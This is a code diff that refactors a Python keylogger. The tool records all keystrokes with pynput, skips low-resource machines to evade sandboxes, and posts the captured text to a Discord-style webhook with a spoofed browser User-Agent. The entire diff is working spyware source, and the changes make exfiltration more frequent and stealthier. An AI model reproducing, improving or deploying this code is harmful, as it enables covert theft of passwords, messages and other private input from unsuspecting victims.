@@ -1,101 +1,96 @@
 from multiprocessing import cpu_count
+
 from psutil import virtual_memory
 
-cpu_count = cpu_count()
-ram_size = int(round(virtual_memory().total / (1024 ** 3)))
-
 if __name__ == "__main__":
-    if ram_size <= 2 or cpu_count < 2:
+    if int(round(virtual_memory().total / (1024**3))) <= 2 or cpu_count() < 2:
         exit()
 
-    from threading import Timer
-    from pynput import keyboard
     from datetime import datetime
-    from requests import post, get, ConnectionError
+    from json import dumps
+    from threading import Timer
+    from urllib import request
 
+    from pynput import keyboard
+
+    webhook_url = ""
     cache = []
+    last_key = None
+    count = 1
     timer = None
-    seconds = 60
-    webhook_url = ''
-    space_count, enter_count, backspace_count = 1, 1, 1
+    seconds = 5
 
     inputs = {
-        96: '0',
-        97: '1',
-        98: '2',
-        99: '3',
-        100: '4',
-        101: '5',
-        102: '6',
-        103: '7',
-        104: '8',
-        105: '9',
+        96: "0",
+        97: "1",
+        98: "2",
+        99: "3",
+        100: "4",
+        101: "5",
+        102: "6",
+        103: "7",
+        104: "8",
+        105: "9",
     }
 
-    def check_connection():
+    def has_internet():
         try:
-            get('https://www.google.com', timeout=5)
+            request.urlopen("https://gstatic.com/generate_204", timeout=3)
             return True
-        except ConnectionError:
+        except:
             return False
 
     def send_cache():
         global cache
-        if cache:
-            if check_connection():
-                now = datetime.now()
-                start_dt = now.strftime('%Y/%m/%d %H:%M:%S')
-                cache = ''.join(i for i in cache)
-                post(webhook_url, json={
-                    'embeds': [{
-                        'title': f'[{start_dt}]',
-                        "color": 0x3498DB,
-                        'description': f'{cache}'
-                    }]
-                })
-                cache = []
+        if cache and has_internet():
+            payload = dumps(
+                {
+                    "embeds": [
+                        {
+                            "title": f"[{datetime.now().strftime('%Y/%m/%d %H:%M:%S')}]",
+                            "color": 0x3498DB,
+                            "description": "".join(cache),
+                        }
+                    ]
+                }
+            ).encode("utf-8")
+
+            req = request.Request(
+                webhook_url,
+                data=payload,
+                headers={
+                    "Content-Type": "application/json",
+                    "User-Agent": "Mozilla/5.0",
+                },
+                method="POST",
+            )
+
+            request.urlopen(req)
+            cache = []
 
     def on_press(key):
-        global cache, timer, space_count, enter_count, backspace_count
+        global cache, timer, last_key, count
         try:
-            if hasattr(key, 'vk') and 96 <= key.vk <= 105:
+            if hasattr(key, "vk") and 96 <= key.vk <= 105:
                 cache.append(inputs[key.vk])
             else:
                 cache.append(key.char)
-            enter_count = 1
-            space_count = 1
-            backspace_count = 1
+
+            last_key = key
         except AttributeError:
-            # WARN: this is badly made xD, I'm sorry
-            if key.name == 'space':
-                if cache and cache[-1] == ' ' or space_count != 1:
-                    space_count += 1
-                    cache[-1] = (f'[{key.name}x{space_count}]')
-                else:
-                    cache.append(' ')
-                enter_count = 1
-                backspace_count = 1
-            elif key.name == 'enter':
-                if cache and cache[-1] == '\n' or enter_count != 1:
-                    enter_count += 1
-                    cache[-1] = (f'[{key.name}x{enter_count}]')
-                else:
-                    cache.append('\n')
-                space_count = 1
-                backspace_count = 1
-            elif key.name == 'backspace':
-                if cache and cache[-1] == '[backspace]' or backspace_count != 1:
-                    backspace_count += 1
-                    cache[-1] = (f'[{key.name}x{backspace_count}]')
-                else:
-                    cache.append(f'[{key.name}]')
-                enter_count = 1
-                space_count = 1
+            if last_key and last_key == key:
+                count += 1
+                cache[-1] = f"[{key.name}x{count}]"
+            elif key.name == "space":
+                cache.append(" ")
+                last_key = key
+            elif key.name == "enter":
+                cache.append("\n")
+                last_key = key
             else:
-                cache.append(f'[{key.name}]')
-                space_count = 1
-                enter_count = 1
-                backspace_count = 1
+                cache.append(f"[{key.name}]")
+                last_key = key
+
         if timer and len(cache) <= 500:
             timer.cancel()
             timer = Timer(seconds, send_cache)
@@ -104,6 +99,6 @@ if __name__ == "__main__":
             timer = Timer(seconds, send_cache)
             timer.start()
 
-    keyboard_listener = keyboard.Listener(on_press=on_press)
-    keyboard_listener.start()
-    keyboard_listener.join()
+    with keyboard.Listener(on_press=on_press) as listener:
+        print("listening...")
+        listener.join()
